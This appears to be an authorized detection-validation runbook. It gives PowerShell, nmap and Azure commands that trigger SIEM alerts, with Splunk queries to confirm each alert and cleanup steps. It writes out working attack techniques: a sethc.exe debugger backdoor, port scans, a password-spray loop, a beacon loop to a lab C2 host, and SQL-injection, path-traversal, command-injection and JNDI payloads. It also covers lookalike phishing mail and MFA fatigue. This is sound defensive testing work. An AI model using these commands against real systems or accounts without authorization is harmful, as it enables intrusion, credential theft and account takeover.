# TDA Use-Case Trigger Runbook

Authorized detection-validation runbook. For each use case: **what it detects →
what you need → step-by-step commands → how to validate**. Safe test artifacts
only (EICAR, benign files, test PII, Atomic Red Team, reversible registry keys).

> **Rules of engagement:** written authorization required. Note UTC time +
> source host/IP for every test. Announce to the SOC before running. Clean up
> after. Replace every `<PLACEHOLDER>` with a real value.

## Feasibility from ONE Windows machine

| ✅ From the Windows box | ⚠️ Needs extra access |
|---|---|
| Host/EDR: UC0032, UC0149, UC0125, UC0185, SPLUC0187, UC0043 | Mail: UC0222, SPLUC0107 → SMTP relay + target mailbox |
| Network: UC0053, UC0054, UC0141, UC0046 | DLP: UC0575 → DLP-monitored channel |
| Web: UC0228, UC0229 | Cloud: UC0458/0215/0327, M365 spray, MFA, VM abuse → Azure/M365 creds + Az CLI |
| | Firewall: UC0110 → firewall admin login |

Run in **PowerShell as Administrator** unless noted.

**Two options per test where possible:** a **Manual** method (no tools) and an
**Atomic Red Team (ART)** method. For any ART line, first:
```powershell
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
# then: Invoke-AtomicTest <TID> -GetPrereqs ; Invoke-AtomicTest <TID> ; Invoke-AtomicTest <TID> -Cleanup
```
(Install ART: see `ATOMIC_RED_TEAM_GETTING_STARTED.md`.)

---

# GROUP A — Host / EDR (run on the Windows box)

## UC0032 — Critical Malware Detected on EDR
**Detects:** malware file on the endpoint.
**Requires:** nothing extra (local).
**Option 1 — Manual (EICAR):**
```powershell
# 1. marker
Get-Date -Format "yyyy-MM-dd HH:mm:ss" ; hostname
# 2. create EICAR test file
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content -Path "$env:TEMP\eicar.com" -Value $e -Encoding Ascii
# 3. trigger the scan
Get-Content "$env:TEMP\eicar.com"
```
**Option 2 — Atomic Red Team:** `Invoke-AtomicTest T1204.002` (malicious file execution; several tests drop/execute test payloads the EDR flags).
**Validate:**
```spl
index=* host="<HOSTNAME>" ("EICAR" OR "Test-File") earliest=-15m
| table _time host threat_name action file_path
```
**Cleanup:** `Remove-Item "$env:TEMP\eicar.com" -Force`

## UC0149 — Multiple AV Infections on Same Host
**Detects:** several malware hits on one host.
**Requires:** nothing extra.
**Option 1 — Manual (multiple EICAR):**
```powershell
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
1..5 | ForEach-Object { Set-Content "$env:TEMP\eicar_$_.com" -Value $e -Encoding Ascii }
Get-ChildItem "$env:TEMP\eicar_*.com" | ForEach-Object { Get-Content $_.FullName | Out-Null }
```
**Option 2 — Atomic Red Team:** no direct EICAR test; run several file-drop tests, e.g. `Invoke-AtomicTest T1204.002 -TestNumbers 1,2,3`, to generate multiple detections on the host.
**Validate:**
```spl
index=* host="<HOSTNAME>" ("EICAR" OR "Test-File") earliest=-30m
| stats dc(file_path) as infections by host | where infections>=2
```
**Cleanup:** `Remove-Item "$env:TEMP\eicar_*.com" -Force`

## UC0125 — Common Ransomware Extensions Detected
**Detects:** mass file rename to known ransomware extensions + ransom note.
**Requires:** nothing extra.
**Option 1 — Manual:**
```powershell
$dir = "$env:TEMP\ransomtest"; New-Item -ItemType Directory -Force $dir | Out-Null
$ext = ".locky",".crypt",".encrypted",".wncry",".cerber",".zepto",".crypto",".enc"
1..20 | ForEach-Object {
  $f = "$dir\doc$_.txt"; "test data" | Set-Content $f
  Rename-Item $f "$dir\doc$_$($ext[$_ % $ext.Count])"
}
"Your files are encrypted. Pay to recover." | Set-Content "$dir\READ_ME_DECRYPT.txt"
```
**Option 2 — Atomic Red Team:** `Invoke-AtomicTest T1486` (Data Encrypted for Impact — includes ransomware-extension/encryption simulation tests). Preview with `-ShowDetailsBrief` and always `-Cleanup`.
**Validate:**
```spl
index=* host="<HOSTNAME>" (".locky" OR ".wncry" OR ".encrypted" OR "READ_ME_DECRYPT") earliest=-15m
| table _time host New_Process_Name Process_Command_Line
```
**Cleanup:** `Remove-Item "$env:TEMP\ransomtest" -Recurse -Force`

## UC0185 — Abuse of Accessibility Binaries (Sticky Keys / Shift ×5)
**Detects:** debugger set on `sethc.exe`/`utilman.exe` (reversible registry method).
**Requires:** local admin.
**Option 1 — Manual (reversible registry):**
```powershell
Get-Date -Format "yyyy-MM-dd HH:mm:ss" ; hostname
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```
**Option 2 — Atomic Red Team:** `Invoke-AtomicTest T1546.008` (accessibility features — sethc/utilman). Has built-in cleanup.
**Validate:**
```spl
index=* host="<HOSTNAME>" ("Image File Execution Options" AND ("sethc.exe" OR "utilman.exe")) earliest=-15m
| table _time host EventCode Object_Name Process_Command_Line
```
**Cleanup:**
```powershell
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
```

## SPLUC0187 — Scheduled Task Calling Malicious Child Process
**Detects:** a scheduled task spawning a shell.
**Requires:** local admin + process-creation auditing (4688) enabled.
**Enable auditing first (if not already):**
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable
```
**Option 1 \u2014 Manual:**
```powershell
schtasks /create /tn "uc0187test" /tr "cmd.exe /c whoami > %TEMP%\uc0187.txt" /sc once /st 23:59 /f
schtasks /run /tn "uc0187test"
schtasks /delete /tn "uc0187test" /f
```
**Option 2 \u2014 Atomic Red Team:** `Invoke-AtomicTest T1053.005` (scheduled task/job).
**Validate:**
```spl
index=* host="<HOSTNAME>" EventCode=4688 New_Process_Name="*cmd.exe" Creator_Process_Name="*svchost.exe" earliest=-15m
| table _time Creator_Process_Name New_Process_Name Process_Command_Line
```

## UC0043 — Threat Activity Detected (generic recon burst)
**Detects:** multiple attacker-style discovery commands from one host.
**Requires:** nothing extra.
**Option 1 — Manual:**
```powershell
whoami /all; net user; net group "domain admins" /domain; systeminfo; tasklist; nltest /domain_trusts
```
**Option 2 — Atomic Red Team:** `Invoke-AtomicTest T1057` (process discovery), `T1082` (system info), `T1016` (network config), `T1033` (user discovery).
**Validate:** several discovery processes from one host in a short window (4688).

---

# GROUP B — Network (run from the Windows box)

## UC0053 — Horizontal Port Scan (one port, many hosts)
**Requires:** reachable subnets.
**Option 1 — Manual (PowerShell, no tools — good if nmap is blocked by EDR):**
```powershell
Get-Date -Format "yyyy-MM-dd HH:mm:ss" ; ipconfig | findstr IPv4
$port=445
"172.16.75","172.16.5" | ForEach-Object { $s=$_; 1..254 | ForEach-Object {
  $ip="$s.$_"; $t=New-Object System.Net.Sockets.TcpClient
  $c=$t.BeginConnect($ip,$port,$null,$null)
  if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$port OPEN"; try{$t.EndConnect($c)}catch{}}
  $t.Close() } }
```
**Option 2 — nmap / Zenmap:** `nmap -sS -Pn -n -p 445 172.16.75.0/24 172.16.5.0/24`
**Option 3 — Atomic Red Team:** `Invoke-AtomicTest T1046` (network service discovery — some tests use nmap; may be EDR-blocked).
**Validate:**
```spl
index=* src="<YOUR_IP>" dest_port=445 earliest=-15m | stats dc(dest_ip) as hosts by src | where hosts>=51
```

## UC0054 — Vertical Port Scan (many ports, one host)
**Requires:** a reachable target.
**Option 1 — Manual (PowerShell):**
```powershell
$ip="<TARGET>"
1..1024 | ForEach-Object { $p=$_; $t=New-Object System.Net.Sockets.TcpClient
  $c=$t.BeginConnect($ip,$p,$null,$null)
  if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$p OPEN"; try{$t.EndConnect($c)}catch{}}
  $t.Close() }
```
**Option 2 — nmap / Zenmap:** `nmap -sS -Pn -n -p- <TARGET>`
**Option 3 — Atomic Red Team:** `Invoke-AtomicTest T1046`.
**Validate:**
```spl
index=* src="<YOUR_IP>" dest="<TARGET>" earliest=-15m | stats dc(dest_port) as ports by dest | where ports>=100
```

## UC0141 — C2 / Command-and-Control Traffic
**Detects:** periodic beacon-like outbound connections.
**Requires:** a **lab-controlled** endpoint to beacon to (NOT real malicious infra).
**Option 1 — Manual (beacon loop):**
```powershell
$c2="http://<LAB_C2_HOST>/beacon"
1..30 | ForEach-Object {
  try { Invoke-WebRequest $c2 -UseBasicParsing -TimeoutSec 5 -Headers @{ "User-Agent"="Mozilla/5.0 (compatible; beacon)" } | Out-Null } catch {}
  Start-Sleep -Seconds 10
}
```
**Option 2 — Atomic Red Team:** `Invoke-AtomicTest T1071.001` (web-protocol C2) or `T1095`. Some tests need a listener.
**Validate:** proxy/firewall logs — same src→dest, regular interval, many small requests.

## UC0046 — Password Spray Detected
**Detects:** one password tried against many accounts.
**Requires:** a domain user list + authorization (agree accounts, small password list to avoid lockouts).
**Setup — get a user list:**
```powershell
net user /domain > users_raw.txt      # or use an agreed list -> users.txt
```
**Option 1 — Manual:**
```powershell
$users = Get-Content .\users.txt
$pw = "Winter2026!"
foreach ($u in $users) {
  Start-Process cmd -ArgumentList "/c net use \\<DC>\IPC$ /user:$u $pw" -WindowStyle Hidden
  Start-Sleep -Milliseconds 300
}
```
**Option 2 — DomainPasswordSpray tool:** `Invoke-DomainPasswordSpray -Password "Winter2026!"`
**Option 3 — Atomic Red Team:** `Invoke-AtomicTest T1110.003` (password spraying).
**Validate:**
```spl
index=* EventCode=4625 earliest=-15m | stats dc(user) as accounts by src | where accounts>=10
```

---

# GROUP C — Web (from the Windows box against the web app)

> **Atomic Red Team note:** ART focuses on endpoint techniques, not web-app
> attacks. For SQLi/web-exploit use the manual commands below or Kali tools
> (`sqlmap`, `gobuster`, `nikto`, ZAP). No ART option.

## UC0228 — SQL Injection Attempt (pattern match)
**Requires:** a reachable web app URL.
**Steps:**
```powershell
$u="http://<WEBAPP>"
"1' OR '1'='1","1; DROP TABLE users--","' UNION SELECT null,username,password FROM users--" | ForEach-Object {
  $p=[uri]::EscapeDataString($_)
  try { Invoke-WebRequest "$u/product?id=$p" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {}
}
```
(Kali alt: `sqlmap -u "http://<WEBAPP>/product?id=1" --batch`.)
**Validate:** WAF/web logs show SQLi patterns from your source IP.

## UC0229 — Web Application Exploit Detected
**Requires:** a reachable web app URL.
**Steps:**
```powershell
$u="http://<WEBAPP>"
@(
 "/search?q=<script>alert(1)</script>",
 "/download?file=../../../../etc/passwd",
 "/ping?host=127.0.0.1;whoami",
 '/api?x=${jndi:ldap://127.0.0.1/a}'
) | ForEach-Object { try { Invoke-WebRequest "$u$_" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {} }
```
**Validate:** WAF/IPS/web logs flag the exploit patterns. (More payloads in this repo's `OWASP_TOP10_TEST_COMMANDS.md`.)

---

# GROUP D — Email / DLP (needs a mail channel / DLP path)

## UC0222 — Suspicious Email Attachment / Malware by Mail
**Detects:** malware or dangerous-extension attachment in email.
**Requires:**
- An **SMTP server/relay** you can send through (`<SMTP_SERVER>`).
- A **target mailbox** in the org (`<victim@customer.com>`).
- The EICAR file from UC0032, and/or a file with a risky extension.
**Steps:**
```powershell
# make a risky-extension attachment
Copy-Item C:\Windows\System32\calc.exe "$env:TEMP\invoice.exe"
# send EICAR (mail-AV test) + risky attachment (extension rule test)
Send-MailMessage -From "test-sender@yourlab.local" -To "<victim@customer.com>" `
  -Subject "Invoice attached" -Body "Please review the attached invoice." `
  -Attachments "$env:TEMP\eicar.com","$env:TEMP\invoice.exe" `
  -SmtpServer "<SMTP_SERVER>"
```
**Validate:** mail security / SIEM shows the malware verdict or blocked extension.
> `Send-MailMessage` is deprecated but works. If blocked, use an authorized phishing-sim platform or a test relay.

## SPLUC0107 — Suspected Phishing Email
**Detects:** phishing-style email.
**Requires:** SMTP relay + monitored target mailbox (as above).
**Steps:**
```powershell
Send-MailMessage -From "security-alert@micros0ft-support.com" -To "<victim@customer.com>" `
  -Subject "URGENT: Your account will be suspended" `
  -Body "Verify now: http://<LAB_PHISH_HOST>/login" `
  -SmtpServer "<SMTP_SERVER>"
```
(Lookalike sender, urgency, suspicious link → phishing indicators.)
**Validate:** mail security / phishing detection flags the message.

## UC0575 — Multiple DLP Violations for a User
**Detects:** one user causing several DLP violations.
**Requires:** a **DLP solution monitoring a channel** (endpoint DLP, email DLP, or web upload), and permission to send test PII.
**Setup — create test-sensitive files (fake data):**
```powershell
$dir="$env:TEMP\dlptest"; New-Item -ItemType Directory -Force $dir | Out-Null
1..5 | ForEach-Object {
@"
Credit Card: 4111 1111 1111 1111
SSN: 123-45-6789
IBAN: GB82 WEST 1234 5698 7654 32
"@ | Set-Content "$dir\sensitive_$_.txt"
}
```
**Steps:** move these through the DLP-monitored channel **multiple times** (≥2), e.g.:
- Email them out: `Send-MailMessage -From <you> -To <external> -Attachments "$dir\sensitive_1.txt" -SmtpServer <SMTP>` (repeat for each file), or
- Upload each to a monitored web app / copy to USB.
**Validate:** DLP console / SIEM shows ≥2 violations for the same user.

---

# GROUP E — Cloud: Azure / M365 (needs cloud credentials)

**Requires for all of Group E:** an Azure/M365 test account with the right role, and tooling:
```powershell
winget install --id Microsoft.AzureCLI -e          # Az CLI
Install-Module Microsoft.Graph -Scope CurrentUser  # Graph (for Entra/M365)
az login                                            # sign in
```
> **Atomic Red Team note:** ART has a cloud set (e.g. `T1078.004` valid cloud
> accounts, `T1098` account manipulation) runnable with `-anywhere` against
> Azure/M365, but it still needs the same cloud credentials. The `az`/Graph
> commands below are the simplest path. No agent-only option exists for cloud.

## UC0458 — Azure Activity CRUD Operation Detected
**Requires:** Azure account with rights to create/delete a resource group.
**Steps:**
```powershell
az group create -n tda-test-rg -l eastus                         # CREATE
az group update -n tda-test-rg --set tags.test=tda               # UPDATE
az group delete -n tda-test-rg --yes --no-wait                   # DELETE
```
**Validate:** Azure Activity Log / Sentinel shows the create/update/delete.

## UC0215 — Explicit MFA Deny
**Requires:** an M365 test account with MFA (Authenticator).
**Steps:** sign in to `https://portal.office.com` with the test account → at the MFA push, **choose Deny / "No, it's not me"** (or reject the prompt).
**Validate:** Entra sign-in logs show MFA denied / failure reason = user declined.

## UC0327 — Azure AD Privileged Access Outside PIM
**Requires:** a privileged role assigned **permanently** (not via PIM), or rights to assign one directly.
**Steps:**
```powershell
az role assignment create --assignee <user@tenant> --role "User Access Administrator" --scope /subscriptions/<sub-id>
```
**Validate:** Entra audit log shows privileged action/assignment without a matching PIM activation.

## Password Spraying M365
**Requires:** target tenant + user list + authorization. Tool: MSOLSpray or TREVORspray.
**Setup:**
```powershell
# download MSOLSpray.ps1 from your tooling share, then:
Import-Module .\MSOLSpray.ps1
```
**Steps:**
```powershell
Invoke-MSOLSpray -UserList .\users.txt -Password "Autumn2026!" -Verbose
```
**Validate:** Entra sign-in logs — many failed logons across accounts from one source IP.

## Malicious MFA Takeover
**Requires:** a test account; permission to trigger repeated MFA / register a method.
**Steps:** repeatedly attempt sign-in to spam Authenticator push prompts (MFA fatigue), or register a new MFA method on the test account via `https://aka.ms/mfasetup`.
**Validate:** Entra logs show repeated MFA requests, or a new security-info registration.

## Abusing Virtual Machines
**Requires:** Azure account with `Contributor`/run-command rights on a VM.
**Steps:**
```powershell
az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript --scripts "whoami; hostname"
```
**Validate:** Activity log shows `runCommand` action on the VM (code exec via control plane).

---

# GROUP F — Firewall

## UC0110 — Privilege Change on Firewall
**Detects:** admin account/role/privilege change on the firewall.
**Requires:** **admin login to the firewall** (Palo Alto / Fortinet / Checkpoint / etc.) — not doable from the endpoint. Vendor-specific.
**Steps (example — do on the firewall UI/CLI):** create a new admin user, or change an existing admin's role/profile.
- Palo Alto (CLI): `set mgt-config users tdatest permissions role-based superuser yes` → `commit`
- Fortinet (CLI): `config system admin` → `edit tdatest` → `set accprofile super_admin` → `end`
**Validate:** firewall admin/audit logs (forwarded to SIEM) show the privilege change.

---

## Per-test checklist
1. Note **UTC time + source host/IP**.  2. Announce to SOC.  3. Run the steps.
4. Pull events with the SPL (adjust index/field names to the environment).
5. Record **pass** (detected) / **gap** (no alert).  6. Clean up artifacts.

*Field names (`threat_name`, `dest_port`, `user`, etc.) vary by data source — adjust to the environment. Use only fake/test data for PII and lab-controlled hosts for C2/phishing.*
